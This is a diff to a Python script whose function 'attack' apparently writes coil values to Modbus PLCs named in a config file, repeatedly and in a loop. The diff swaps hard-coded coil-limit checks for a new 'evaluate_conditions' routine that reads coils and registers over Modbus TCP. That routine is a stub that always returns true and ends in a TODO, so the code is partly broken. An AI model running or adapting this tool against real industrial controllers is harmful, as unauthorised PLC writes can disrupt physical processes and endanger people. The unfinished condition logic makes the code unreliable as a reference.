@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import configparser
 import threading
+from pymodbus.client.sync import ModbusTcpClient
 
 def attack(ctx):  
 
@@ -15,55 +16,25 @@ def attack(ctx):
         pckt_number = config.get('params', 'packets_number')
         pckt_value = int(config.get('params', 'packets_value'))
 
+        print(checkTrigger(address))
+
         if(pckt_number == "loop"): 
             while(True):
                 case = 0
                 print('PLC level value', value)
-
-                sup_lim = ""
-                inf_lim = ""
                 
                 if checkTrigger(address):
                     # Trigger checked
-                    if(config.get('plc', 'plc1') == address):
-                        sup_lim = config.get('params', 'coil1_sup_limit')
-                        inf_lim = config.get('params', 'coil1_inf_limit')
-                    elif(config.get('plc', 'plc2') == address): 
-                        sup_lim = config.get('params', 'coil2_sup_limit')
-                        inf_lim = config.get('params', 'coil2_inf_limit')
-                    elif(config.get('plc', 'plc3') == address): 
-                        sup_lim = config.get('params', 'coil3_sup_limit')
-                        inf_lim = config.get('params', 'coil3_inf_limit')
+                    # Call the function to evaluate conditions
+                    all_conditions_true = evaluate_conditions(config)
 
-                    if(sup_lim == "" and inf_lim == ""): # No limits
-                        print("No limits!")   
-                    elif(sup_lim != "" and inf_lim == ""): # Only sup limit
-                        sup_lim = int(sup_lim)
-                        if(value >= sup_lim):
-                            trigger_operation_plc(pckt_value, address)
-                        else:
-                            print("Waiting for triggers...")
-                            value +=1
-                        
-                    elif(sup_lim == "" and inf_lim != ""): # Only inf limit
-                        inf_lim = int(inf_lim)
-                        if(value <= inf_lim):
-                            trigger_operation_plc(pckt_value, address)
-                        else:
-                            print("Waiting for triggers...")
-                            value -=1
-                                                            
+                    # Perform an operation if all conditions are true
+                    if all_conditions_true:
+                        # Your operation code here
+                        print("All conditions are true. Performing the operation.")
+                        trigger_operation_plc(pckt_value, address)
                     else:
-                        sup_lim = int(sup_lim)
-                        inf_lim = int(inf_lim)
-                        if(value <= sup_lim and value >= inf_lim):
-                            trigger_operation_plc(pckt_value, address)
-                        else:
-                            print("Waiting for triggers...")
-                            if(value > sup_lim):
-                                value -= 1
-                            elif(value < inf_lim):
-                                value +=1
+                        print("Waiting for triggers...")
                       
                 else:
                     # Trigger unchecked - only main conditions
@@ -78,49 +49,20 @@ def attack(ctx):
                 
                 if checkTrigger(address):
                     # Trigger checked
-                    if(config.get('plc', 'plc1') == address):
-                        sup_lim = config.get('params', 'coil1_sup_limit')
-                        inf_lim = config.get('params', 'coil1_inf_limit')
-                    elif(config.get('plc', 'plc2') == address): 
-                        sup_lim = config.get('params', 'coil2_sup_limit')
-                        inf_lim = config.get('params', 'coil2_inf_limit')
-                    elif(config.get('plc', 'plc3') == address): 
-                        sup_lim = config.get('params', 'coil3_sup_limit')
-                        inf_lim = config.get('params', 'coil3_inf_limit')
+                    # Call the function to evaluate conditions
+                    all_conditions_true = evaluate_conditions(config)
 
-                    if(sup_lim == "" and inf_lim == ""): # No limits
-                        print("No limits!")   
-                    elif(sup_lim != "" and inf_lim == ""): # Only sup limit
-                        sup_lim = int(sup_lim)
-                        if(value >= sup_lim):
-                            trigger_operation_plc(pckt_value, address)
-                        else:
-                            print("Waiting for triggers...")
-                            value +=1
-                        
-                    elif(sup_lim == "" and inf_lim != ""): # Only inf limit
-                        inf_lim = int(inf_lim)
-                        if(value <= inf_lim):
-                            trigger_operation_plc(pckt_value, address)
-                        else:
-                            print("Waiting for triggers...")
-                            value -=1
-                                                            
+                    # Perform an operation if all conditions are true
+                    if all_conditions_true:
+                        # Your operation code here
+                        print("All conditions are true. Performing the operation.")
+                        trigger_operation_plc(pckt_value, address)
                     else:
-                        sup_lim = int(sup_lim)
-                        inf_lim = int(inf_lim)
-                        if(value <= sup_lim and value >= inf_lim):
-                            trigger_operation_plc(pckt_value, address)
-                        else:
-                            print("Waiting for triggers...")
-                            if(value > sup_lim):
-                                value -= 1
-                            elif(value < inf_lim):
-                                value +=1
+                        print("Waiting for triggers...")
                       
                 else:
                     # Trigger unchecked - only main conditions
-                            trigger_operation_plc(pckt_value, address)
+                        trigger_operation_plc(pckt_value, address)
                 ct = ct + 1
     
 
@@ -129,29 +71,11 @@ def attack(ctx):
         config = configparser.ConfigParser()
         config.read('config.ini')
 
-        if(address == config.get('plc', 'plc1')):
-            coil_1_sup_limit = config.get('params', 'coil1_sup_limit')
-            coil_1_inf_limit = config.get('params', 'coil1_inf_limit')
-
-            if(coil_1_sup_limit == "" and coil_1_inf_limit == ""):
-                return False
-
-        elif(address == config.get('plc', 'plc2')):
-            coil_2_sup_limit = config.get('params', 'coil2_sup_limit')
-            coil_2_inf_limit = config.get('params', 'coil2_inf_limit')
-
-            if(coil_2_sup_limit == "" and coil_2_inf_limit == ""):
-                return False
-
-        elif(address == config.get('plc', 'plc3')):
-            coil_3_sup_limit = config.get('params', 'coil3_sup_limit')
-            coil_3_inf_limit = config.get('params', 'coil3_inf_limit')
-
-            if(coil_3_sup_limit == "" and coil_3_inf_limit == ""):
-                return False
-        
-
-        return True
+        if 'params' in config:
+            for param_name in config['params']:
+                if param_name.startswith('condition'):
+                    return True
+        return False
     
     
     
@@ -170,7 +94,7 @@ def attack(ctx):
         elif(address == config.get('plc', 'plc3')):
             plc_choice = config.get('params', 'plc3_choice')
             sett = "plc3"
-            
+         
             
         coil = []
         reg = []
@@ -204,6 +128,61 @@ def attack(ctx):
         elif p_val == 1:
             print('COMMAND ON - Value wrote:', p_val)
 
+    
+    def evaluate_conditions(config):
+        all_conditions_true = True
+        for section_name in config.sections():
+            for param_name, param_value in config[section_name].items():
+                if param_name.startswith('condition'):
+                    # Split the condition value into components
+                    combined_ip, device, cond, value = param_value.split()
+
+                    # Split the combined string into IP and port
+                    ip, port = combined_ip.split(':')
+
+                    # Convert the port to an integer
+                    port = int(port)
+
+                    # Determine the device type and number
+                    device_type = device[0]
+                    device_number = int(device[1:])
+
+                    client = ModbusTcpClient(ip, port)
+                    # Connect to the PLC
+                    client.connect()
+
+                    if device_type == 'c':
+                        result = client.read_coils(device_number, 1, unit=1)
+                        if not result.isError() and len(result.bits) == 1:
+                            coil_value = bool(result.bits[0])  # Convert to boolean
+                            print(f"Value of coil {device_number}: {coil_value}")
+                        else:
+                            print(f"Error reading coil {device_number}")
+                    elif device_type == "i":
+                        result = client.read_input_registers(device_number, 1, unit=1)
+                        if not result.isError() and len(result.registers) == 1:
+                            input_register_value = result.registers[0]
+                            print(f"Value of input register {device_number}: {input_register_value}")
+                        else:
+                            print(f"Error reading input register {device_number}")
+                    elif device_type == "m":
+                        result = client.read_holding_registers(device_number, 1, unit=1)
+                        if not result.isError() and len(result.registers) == 1:
+                            holding_register_value = result.registers[0]
+                            print(f"Value of holding register {device_number}: {holding_register_value}")
+                        else:
+                            print(f"Error reading holding register {device_number}")
+                    else:
+                        print(f"Unsupported device type: {device_type}")
+
+                    client.close()
+
+                    #TODO
+
+
+        return all_conditions_true
+    
+    
     
     # Read from config.ini
     config = configparser.ConfigParser()
